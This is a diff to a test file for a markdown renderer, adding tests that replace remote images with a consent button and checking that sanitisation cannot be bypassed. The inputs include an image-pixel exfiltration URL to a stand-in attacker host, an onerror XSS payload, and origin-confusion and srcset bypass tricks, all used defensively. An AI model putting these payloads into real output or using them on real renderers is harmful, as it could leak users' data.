@@ -103,6 +103,77 @@ describe("renderMarkdown", () => {
     expect(renderMarkdown("")).toBe("");
   });
 
+  describe("remote images require consent", () => {
+    const image = { apiBase: "http://localhost:24203", cwd: "/work" };
+
+    it.each([
+      "![secret](https://evil.example/pixel?d=secret)",
+      "![secret](http://evil.example/pixel)",
+      "![secret](//evil.example/pixel)",
+      '<img src="https://evil.example/pixel" onerror="alert(1)">',
+      '<img src="//evil.example/pixel">',
+      '<img src="https:&#10;//evil.example/pixel">',
+      '<img src="/\\evil.example/pixel">',
+    ])("replaces %s with an inert, host-labelled button", (text) => {
+      const doc = new DOMParser().parseFromString(renderMarkdown(text, { image }), "text/html");
+      expect(doc.querySelector("img")).toBeNull();
+      const button = doc.querySelector("button.remote-image");
+      expect(button?.textContent).toBe("Load image from evil.example");
+      expect(button?.getAttribute("type")).toBe("button");
+      expect(button?.getAttribute("data-src")).toMatch(/^https?:\/\/evil\.example\//);
+      expect(button?.hasAttribute("onerror")).toBe(false);
+    });
+
+    it.each([
+      "/local-image?path=%2Ftmp%2Fa.png",
+      "data:image/png;base64,iVBORw0KGgo=",
+      `${window.location.origin}/image.png`,
+      "http://localhost:24203/images/conversation/image.png",
+    ])("keeps trusted image %s", (src) => {
+      expect(imageSrc(renderMarkdown(`<img src="${src}">`, { image }))).toBe(src);
+    });
+
+    it("compares exact origins, not hostname prefixes or URL credentials", () => {
+      for (const src of [
+        "http://localhost:24203.evil.example/a.png",
+        "http://localhost:24203@evil.example/a.png",
+        "http://localhost:24206/a.png",
+        "https://localhost:24203/a.png",
+      ]) {
+        expect(imageSrc(renderMarkdown(`<img src="${src}">`, { image }))).toBeNull();
+      }
+    });
+
+    it("does not leak a backend allowlist between renders", () => {
+      const text = "![pic](http://localhost:24203/a.png)";
+      expect(imageSrc(renderMarkdown(text, { image }))).not.toBeNull();
+      expect(imageSrc(renderMarkdown(text))).toBeNull();
+    });
+
+    it("removes responsive image sources so srcset cannot bypass consent", () => {
+      const html = renderMarkdown(
+        '<picture><source srcset="https://evil.example/a.png"><img src="/safe.png" srcset="https://evil.example/b.png 2x"></picture>',
+      );
+      expect(html).not.toContain("srcset");
+      expect(html).not.toContain("evil.example");
+    });
+
+    it("blocks images in streaming tails and settled prefixes too", () => {
+      const state = createStreamingMarkdown();
+      const text = "![pic](https://evil.example/pixel)";
+      expect(imageSrc(renderMarkdownTail(text))).toBeNull();
+      expect(advance(state, text).tailHtml).toContain("remote-image");
+      const settled = advance(state, `${text}\n\nafter\n`);
+      expect(settled.prefixHtml).toContain("remote-image");
+      expect(imageSrc(settled.prefixHtml)).toBeNull();
+    });
+
+    it("does not affect other DOMPurify consumers", async () => {
+      const { default: purify } = await import("dompurify");
+      expect(imageSrc(purify.sanitize('<img src="https://evil.example/a.png">'))).not.toBeNull();
+    });
+  });
+
   describe("local-path images", () => {
     const BASE = "http://localhost:24203";
     const image = { apiBase: BASE, cwd: "/w/foo" };
@@ -141,13 +212,7 @@ describe("renderMarkdown", () => {
       expect(imageSrc(renderMarkdown("![shot](shot.png)"))).toBe("shot.png");
     });
 
-    it("leaves remote http(s) and data: images untouched", () => {
-      expect(imageSrc(renderMarkdown("![remote](https://example.com/a.png)", { image }))).toBe(
-        "https://example.com/a.png",
-      );
-      expect(imageSrc(renderMarkdown("![remote](http://example.com/a.png)", { image }))).toBe(
-        "http://example.com/a.png",
-      );
+    it("leaves data: images untouched", () => {
       const data = "data:image/png;base64,iVBORw0KGgo=";
       expect(imageSrc(renderMarkdown(`![inline](${data})`, { image }))).toBe(data);
     });
